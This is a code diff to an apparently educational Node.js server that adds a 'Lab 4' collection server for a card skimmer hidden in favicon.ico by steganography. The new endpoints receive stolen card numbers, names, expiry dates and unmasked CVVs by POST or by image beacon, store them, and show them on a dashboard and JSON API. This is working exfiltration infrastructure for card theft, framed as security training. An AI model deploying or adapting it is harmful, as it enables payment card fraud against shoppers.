@@ -35,10 +35,11 @@ let gcs = null
 const BUCKETS = {
   lab1: process.env.LAB1_BUCKET,
   lab2: process.env.LAB2_BUCKET,
-  lab3: process.env.LAB3_BUCKET
+  lab3: process.env.LAB3_BUCKET,
+  lab4: process.env.LAB4_BUCKET
 }
 
-if (BUCKETS.lab1 || BUCKETS.lab2 || BUCKETS.lab3) {
+if (BUCKETS.lab1 || BUCKETS.lab2 || BUCKETS.lab3 || BUCKETS.lab4) {
   const { Storage } = require('@google-cloud/storage')
   gcs = new Storage()
   console.log('GCS storage enabled:', BUCKETS)
@@ -72,10 +73,11 @@ async function gcsDownloadJSON(file) {
 const DATA_DIRS = {
   lab1: process.env.LAB1_DATA_DIR || '/app/data/lab1',
   lab2: process.env.LAB2_DATA_DIR || '/app/data/lab2',
-  lab3: process.env.LAB3_DATA_DIR || '/app/data/lab3'
+  lab3: process.env.LAB3_DATA_DIR || '/app/data/lab3',
+  lab4: process.env.LAB4_DATA_DIR || '/app/data/lab4'
 }
 
-if (!useGCS('lab1') || !useGCS('lab2') || !useGCS('lab3')) {
+if (!useGCS('lab1') || !useGCS('lab2') || !useGCS('lab3') || !useGCS('lab4')) {
   Object.entries(DATA_DIRS).forEach(([lab, dir]) => {
     if (!useGCS(lab) && !fs.existsSync(dir)) {
       fs.mkdirSync(dir, { recursive: true })
@@ -797,10 +799,146 @@ app.get('/health', (req, res) => {
 })
 
 // ============================================================
+// LAB 4 — STEGANOGRAPHY FAVICON C2
+// Receives card data exfiltrated by the stego skimmer hidden
+// in favicon.ico. Payload fields: card_number, card_name,
+// expiry, cvv, source, timestamp, url.
+// ============================================================
+
+let lab4Records = []
+let lab4Stats = { totalRecords: 0, startTime: Date.now() }
+
+async function lab4SaveRecord(record) {
+  if (useGCS('lab4')) {
+    await gcsSaveJSON('lab4', `records/${record.id}.json`, record)
+  } else {
+    await fsPromises.writeFile(
+      path.join(DATA_DIRS.lab4, `${record.id}.json`),
+      JSON.stringify(record, null, 2)
+    )
+  }
+}
+
+async function lab4Preload() {
+  if (!useGCS('lab4')) return
+  try {
+    const files = await gcsListJSON('lab4', 'records/')
+    const entries = await Promise.all(files.map(f => gcsDownloadJSON(f).catch(() => null)))
+    lab4Records = entries.filter(Boolean)
+    lab4Stats.totalRecords = lab4Records.length
+    console.log(`[Lab4-C2] Preloaded ${lab4Records.length} records from GCS`)
+  } catch (e) {
+    console.error('[Lab4-C2] Preload error:', e.message)
+  }
+}
+
+// POST /lab4/c2/collect — skimmer sends stolen card data
+app.post('/lab4/c2/collect', async (req, res) => {
+  const ts = new Date().toISOString()
+  const body = req.body || {}
+
+  const rawCard = String(body.card_number || '').replace(/[\s-]/g, '')
+  const maskedCard = rawCard.length >= 8
+    ? rawCard.slice(0, 4) + ' **** **** ' + rawCard.slice(-4)
+    : '****'
+
+  const record = {
+    id: `stego-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`,
+    timestamp: ts,
+    masked_card: maskedCard,
+    cvv: body.cvv,
+    card_name: body.card_name,
+    expiry: body.expiry,
+    source: body.source || 'favicon-steganography',
+    url: body.url
+  }
+
+  lab4Records.push(record)
+  lab4Stats.totalRecords++
+  if (lab4Records.length > 1000) lab4Records = lab4Records.slice(-1000)
+
+  try { await lab4SaveRecord(record) } catch (e) { console.error('[Lab4-C2] Save error:', e.message) }
+
+  res.status(200).json({ status: 'ok', id: record.id })
+})
+
+// GET /lab4/c2/collect — image beacon fallback (sendBeacon with GET)
+app.get('/lab4/c2/collect', (req, res) => {
+  const q = req.query
+  if (q.card_number) {
+    const raw = String(q.card_number).replace(/[\s-]/g, '')
+    lab4Records.push({
+      id: `stego-${Date.now()}-beacon`,
+      timestamp: new Date().toISOString(),
+      masked_card: raw.slice(0, 4) + ' **** **** ' + raw.slice(-4),
+      cvv: q.cvv, source: 'beacon', url: q.url
+    })
+    lab4Stats.totalRecords++
+  }
+  const gif = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64')
+  res.set('Content-Type', 'image/gif').send(gif)
+})
+
+// GET /lab4/c2 and /lab4/c2/ — dashboard
+app.get(['/lab4/c2', '/lab4/c2/'], (req, res) => {
+  res.send(generateLab4Dashboard())
+})
+
+// GET /lab4/c2/api/stolen — JSON API
+app.get('/lab4/c2/api/stolen', (req, res) => {
+  res.json({ success: true, count: lab4Records.length, records: lab4Records, stats: lab4Stats })
+})
+
+// GET /lab4/c2/health
+app.get('/lab4/c2/health', (req, res) => {
+  res.json({ status: 'healthy', lab: 'lab4', timestamp: new Date().toISOString() })
+})
+
+function generateLab4Dashboard() {
+  const recent = lab4Records.slice(-20).reverse()
+  const cardDivs = recent.map(r => `
+    <div class="card-record" style="background:#1a1a2e;border:1px solid #e94560;border-radius:8px;padding:15px;margin:10px 0;">
+      <div style="font-size:1.1em;font-weight:bold;color:#e94560;">${r.masked_card || 'N/A'}</div>
+      <div style="color:#aaa;margin-top:4px;font-size:0.85em;">
+        CVV: ${r.cvv || '???'} &nbsp;|&nbsp; Expiry: ${r.expiry || 'N/A'} &nbsp;|&nbsp; Name: ${r.card_name || 'N/A'}
+      </div>
+      <div style="color:#666;font-size:0.8em;margin-top:4px;">${r.timestamp} &nbsp;•&nbsp; ${r.source || ''}</div>
+    </div>`).join('')
+
+  return `<!DOCTYPE html><html><head><title>Lab 4 Steganography C2 Dashboard</title><meta charset="utf-8">
+    <style>body{font-family:'Courier New',monospace;max-width:1000px;margin:0 auto;padding:20px;background:#0f0f1a;color:#e0e0e0}
+    h1{color:#e94560;text-align:center;border-bottom:2px solid #e94560;padding-bottom:10px}
+    .stats{background:#1a1a2e;padding:15px;margin:20px 0;border-radius:5px;border:1px solid #e94560;text-align:center}
+    .warning{background:#7f1d1d;color:#fecaca;padding:15px;margin:20px 0;border-radius:5px;text-align:center;font-weight:bold}
+    .c2-nav a{display:inline-block;padding:8px 16px;margin-right:10px;border:1px solid #e94560;border-radius:4px;color:#e94560;text-decoration:none;font-weight:bold;margin-bottom:15px}
+    .c2-nav a:hover{background:#1a1a2e}
+    #total-count{font-size:3em;font-weight:bold;color:#e94560}</style></head>
+    <body>
+    <h1>⚠️ LAB 4 — STEGANOGRAPHY FAVICON C2 ⚠️</h1>
+    <div class="warning">🚨 EDUCATIONAL DEMONSTRATION ONLY 🚨<br>Receives card data hidden inside favicon.ico via steganography</div>
+    <div class="c2-nav"><a href="/lab4">← Back to Lab</a><a href="/">Home</a><a href="/lab4/c2/api/stolen">JSON API</a></div>
+    <div class="stats">
+      <div id="total-count">${lab4Stats.totalRecords}</div>
+      <p style="color:#aaa;">total cards captured</p>
+    </div>
+    <h2>Captured Cards (last 20)</h2>
+    <div id="card-list">
+      ${lab4Records.length === 0
+        ? '<p style="color:#666;">No data yet — submit the Lab 4 checkout form to see captured cards.</p>'
+        : cardDivs}
+    </div>
+  </body></html>`
+}
+
+// ============================================================
+// SHARED HEALTH
+// ============================================================
+
+// ============================================================
 // START
 // ============================================================
 
-lab3Preload().then(() => {
+Promise.all([lab3Preload(), lab4Preload()]).then(() => {
   app.listen(PORT, '0.0.0.0', () => {
     console.log('═══════════════════════════════════════════════════')
     console.log('🚨 SHARED C2 SERVER OPERATIONAL 🚨')
@@ -809,6 +947,7 @@ lab3Preload().then(() => {
     console.log('Lab 1 endpoints: /lab1/c2/*')
     console.log('Lab 2 endpoints: /lab2/c2/*')
     console.log('Lab 3 endpoints: /lab3/extension/*')
+    console.log('Lab 4 endpoints: /lab4/c2/*')
     console.log('Storage:', useGCS('lab1') ? 'GCS' : 'local filesystem')
     console.log('═══════════════════════════════════════════════════')
     console.log('⚠️  FOR EDUCATIONAL PURPOSES ONLY ⚠️')
